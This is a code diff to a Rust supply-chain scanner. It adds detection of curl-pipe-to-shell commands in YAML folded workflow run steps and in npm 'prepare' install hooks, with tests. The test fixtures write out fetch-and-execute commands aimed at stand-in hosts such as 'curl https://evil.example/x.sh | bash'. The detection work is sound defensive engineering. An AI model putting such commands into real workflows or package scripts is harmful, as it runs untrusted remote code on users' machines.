@@ -460,6 +460,33 @@ fn check_workflow_run_steps(input: &str, findings: &mut Vec<Finding>) {
     let mut curl_pipe_evidence: Option<String> = None;
     let mut untrusted_evidence: Option<(String, String)> = None;
 
+    // YAML folded scalars (`run: >`) join physical source lines with spaces.
+    // Scan serde_yaml's resolved scalar as the runner sees it before retaining
+    // the physical-line pass below as a tolerant fallback for malformed files.
+    // Literal scalars preserve newlines, so `curl` and `| bash` on separate
+    // command lines are still not joined into a false positive.
+    if let Ok(doc) = serde_yaml::from_str::<Value>(input) {
+        if let Some(jobs) = get_field(&doc, "jobs").and_then(Value::as_mapping) {
+            for job in jobs.values() {
+                let Some(steps) = get_field(job, "steps").and_then(Value::as_sequence) else {
+                    continue;
+                };
+                for step in steps {
+                    let Some(script) = get_field(step, "run").and_then(Value::as_str) else {
+                        continue;
+                    };
+                    for line in script.lines() {
+                        scan_run_line(
+                            line.trim(),
+                            &mut curl_pipe_evidence,
+                            &mut untrusted_evidence,
+                        );
+                    }
+                }
+            }
+        }
+    }
+
     for raw_line in input.lines() {
         let indent = raw_line.len() - raw_line.trim_start().len();
         let trimmed = raw_line.trim();
@@ -1576,9 +1603,9 @@ fn helm_url_host(url: &str) -> Option<String> {
 // package.json lifecycle-script checks
 
 /// Scan a `package.json` for a lifecycle install hook (`preinstall`,
-/// `install`, `postinstall`) whose command is dangerous.
+/// `install`, `postinstall`, `prepare`) whose command is dangerous.
 ///
-/// These three hooks run **automatically** on `npm install` — a dangerous
+/// These hooks run **automatically** on `npm install` — a dangerous
 /// command in one of them executes the moment a dependency is installed,
 /// which is the textbook malicious-npm-package delivery mechanism. A *benign*
 /// install hook (`node-gyp rebuild`, `husky install`, `tsc`, …) does not fire.
@@ -1590,10 +1617,10 @@ fn check_package_json(input: &str, findings: &mut Vec<Finding>) {
         return;
     };
 
-    // Only the auto-run lifecycle hooks. `prepare` also runs on install but
-    // also on `npm publish` / local checkout and is very commonly a benign
-    // `husky install` — left out to keep the false-positive rate low.
-    const INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall"];
+    // Only auto-run lifecycle hooks.  `prepare` is common for benign commands
+    // such as `husky install`; dangerous_script_reason keeps those clean while
+    // still blocking an install-time payload hidden in `prepare`.
+    const INSTALL_HOOKS: &[&str] = &["preinstall", "install", "postinstall", "prepare"];
 
     for hook in INSTALL_HOOKS {
         let Some(cmd) = scripts.get(*hook).and_then(|v| v.as_str()) else {
@@ -1932,6 +1959,26 @@ mod tests {
         let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          echo start\n          \
                   wget example.sh | sh\n          echo done\n";
         assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+    }
+
+    #[test]
+    fn workflow_folded_run_scalar_uses_resolved_shell_command() {
+        let wf = "jobs:\n  build:\n    steps:\n      - run: >\n          curl https://evil.example/x.sh\n          | bash\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+    }
+
+    #[test]
+    fn workflow_literal_run_scalar_keeps_distinct_command_lines() {
+        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          curl https://example.test/x.sh\n          | bash\n";
+        assert!(!has(
             wf,
             ".github/workflows/ci.yml",
             RuleId::WorkflowCurlPipeShell
@@ -2772,10 +2819,15 @@ mod tests {
 
     #[test]
     fn package_json_prepare_husky_clean() {
-        // `prepare` is deliberately NOT an install-hook we flag (commonly a
-        // benign `husky install`).
+        // `prepare` runs on install, but a common benign command stays clean.
         let pkg = r#"{"name":"x","scripts":{"prepare":"husky install"}}"#;
         assert!(clean(pkg, "package.json"));
+    }
+
+    #[test]
+    fn package_json_dangerous_prepare_flagged() {
+        let pkg = r#"{"name":"x","scripts":{"prepare":"curl https://evil.test/x | sh"}}"#;
+        assert!(has(pkg, "package.json", RuleId::PackageScriptDangerous));
     }
 
     #[test]
